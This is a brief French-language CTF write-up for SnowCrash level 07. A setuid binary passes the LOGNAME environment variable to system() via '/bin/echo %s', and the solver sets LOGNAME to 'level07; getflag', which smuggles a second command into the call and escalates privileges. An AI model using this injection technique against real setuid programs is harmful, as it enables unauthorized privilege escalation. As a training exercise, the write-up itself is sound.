# Level 07

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

On voit que l'executable level07 appel '/bin/echo' la chaine de caractere se situant dans la variable d'environnement 'LOGNAME'
```bash
level07@SnowCrash:~$ strings level07 | head -n 20
/lib/ld-linux.so.2
zE&9qU
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh 
UWVS
[^_]
LOGNAME
/bin/echo %s 
;*2$"
```

```bash
level07@SnowCrash:~$ export 
declare -x HOME="/home/user/level07"
declare -x LANG="en_US.UTF-8"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="level07"
```

Nous avons juste a initialiser la variable 'LOGNAME' pour qu'il puisse executer 'getflag'

```bash
level07@SnowCrash:~$ export LOGNAME="level07; getflag"
level07@SnowCrash:~$ ./level07 
level07
Check flag.Here is your token : ***************
```